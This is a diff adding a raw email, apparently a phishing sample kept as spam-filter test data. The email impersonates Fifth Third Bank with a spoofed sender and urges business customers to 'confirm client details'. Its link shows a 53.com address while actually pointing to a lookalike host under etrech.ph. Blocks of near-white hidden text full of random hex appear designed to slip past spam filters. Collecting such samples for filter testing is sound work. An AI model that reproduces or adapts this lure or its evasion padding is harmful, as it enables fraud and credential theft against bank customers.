@@ -1,0 +1,59 @@
+From nobody Sun Jan 25 13:49:57 2015
+Return-Path: <investigation_762498710262ver@security.53.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 7D6222A894
+ for <user@example.com>; Wed, 18 Apr 2007 17:31:50 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 3242E621E34
+ for <user@example.com>; Wed, 18 Apr 2007 17:31:50 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 9124D162C0; Wed, 18 Apr 2007 17:39:34 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from 13.red-217-217-3.user.auna.net (13.red-217-217-3.user.auna.net
+ [217.217.3.13])
+ by mail.example.com (Example mail relay) with SMTP id AFE1A162BB
+ for <user@example.com>; Wed, 18 Apr 2007 17:39:33 -0400 (EDT)
+Received: from arkansas.net [75.112.112.210]
+ by gator.com with SMTP id Q8R21Y6G4Q
+ for <user@example.com>; Wed, 18 Apr 2007 17:31:51 -0500
+X-MSMail-Priority: 3 (Normal)
+From: "Fifth Third Bank" <investigation_762498710262ver@security.53.com>
+To: user <user@example.com>
+Subject: Fifth Third Bank - urgent security notification for client [Wed,
+ 18 Apr 2007 17:31:51 -0500]
+X-MSMail-Priority: 3 (Normal)
+User-Agent: MailGate v3.0
+X-Mailer: MailGate v3.0
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--WTHFLOPNDUSKUA"
+Message-Id: <20070418213933.AFE1A162BB@mail.example.com>
+Date: Wed, 18 Apr 2007 17:39:33 -0400 (EDT)
+X-Keywords: 
+Status: O
+Content-Length: 3469
+Lines: 21
+
+----WTHFLOPNDUSKUA
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<html>
+<head>
+<meta http-equiv="Content-Type"      content="text/html;  charset=iso-8859-1">
+</head>
+
+<body  bgcolor="#FFFFFF"     text="#000000">
+<p><font  face="Arial">Dear  Fifth     Third    bank  business/commercial  customer,</font></p>
+<p><font  face="Arial">Fifth      Third   Protection    Department    requests you       to   start      the  client       details       confirmation procedure.   By      clicking  on   the link    at       the      bottom  of  this    letter you       will   get   all      necessary   instructions      how    to      start     and to   complete     the confirmation      procedure.   The  following  steps    are to   be  taken      by   all   business and     commercial  customers   of    the     Fifth   Third      bank.      </font></p>
+<p><font     face="Arial">Fifth     Third   Protection   Department    apologizes for   the     inconveniences     caused    to     you,   and    is      very    grateful for     your cooperation.</font></p>
+<p><font       face="Arial">To       start      the       confirmation   procedure,      click  the    following       link:     </font></p><p><font  face="Arial"><u><a     href="http://businessbanking.53.com.session65821.etrech.ph/clientbase/form.asp">http://businessbanking.53.com/session65821/clientbase/form.asp</a></u></font></p><p><font       size="2" face="Arial">Copyright  &copy; 2007       Fifth   Third  Bank,   Member    FDIC,       Equal       Housing   Lender,     All      Rights     Reserved</font></p><p><font       face="Arial">===========================================================================</font></p>
+<p><font  color="#FFFFFB"  face="Arial">O3M: 0x146, 0x790, 0x809    rev, media, F8V, root, MUZ, X8X   0x2330, 0x046, 0x0664      0x4, 0x74357964, 0x848, 0x4, 0x4, 0x3661  4LX: 0x7, 0x3    interface: 0x4037, 0x530, 0x85, 0x90, 0x7, 0x1841, 0x7, 0x3388, 0x74, 0x59256886, 0x10, 0x57080561, 0x4 0x35, 0x39, 0x68911634, 0x6, 0x76, 0x04883781, 0x7487, 0x9435  0x615, 0x3, 0x58, 0x4030, 0x22   common: 0x2762, 0x05729574, 0x49239893, 0x589, 0x4, 0x90, 0x1939, 0x6500, 0x68, 0x93634747, 0x61, 0x1686</font></p><p><font   color="#FFFFFF"     face="Arial"><span>0x435, 0x4, 0x2   tmp: 0x468, 0x1446, 0x20       0x4144, 0x72677553, 0x258, 0x03724049, 0x40, 0x8, 0x8862, 0x7, 0x14, 0x96115621, 0x856, 0x62069810, 0x16267089  common end 6C9 24F POVE DKH T2E S4FD.  0x184, 0x08751292, 0x32, 0x4, 0x1972, 0x8821, 0x91483837, 0x59465852 0x53 </span><span>QXKO BB1 D8R 8JN rev start   exe: 0x56715947, 0x0167 common: 0x7557, 0x2, 0x9  hex: 0x447</span></font></p>
+<p><font    color="#FFFFF3"   face="Arial"><span>0x011, 0x61, 0x3, 0x60, 0x462, 0x187, 0x75060239, 0x87891641, 0x30335371, 0x81544340, 0x38454148, 0x9, 0x9, 0x8    FYR: 0x7, 0x917, 0x66623637, 0x541, 0x896, 0x50556845, 0x98486239, 0x95, 0x175, 0x30369148, 0x361, 0x49703237, 0x8, 0x30231491, 0x18      0x1, 0x606, 0x3563   interface: 0x7, 0x586, 0x1645, 0x5, 0x1482, 0x11, 0x40061148, 0x53153466, 0x97742998, 0x34, 0x08  hex BJN5.</span><span>0x7, 0x4, 0x8587, 0x1, 0x4582, 0x97, 0x71175958   </span><span>0x1914, 0x478, 0x4123, 0x242, 0x9, 0x1455, 0x4315, 0x0, 0x249, 0x139, 0x3     0x1, 0x268, 0x2769, 0x1189   Z1B api 84SY api Z9P include interface function source.  G0P: 0x63, 0x82902242, 0x954, 0x20, 0x4, 0x077, 0x1087, 0x26695456, 0x5970, 0x103, 0x482</span></font></p>
+</body>
+</html>
+
+
+----WTHFLOPNDUSKUA--
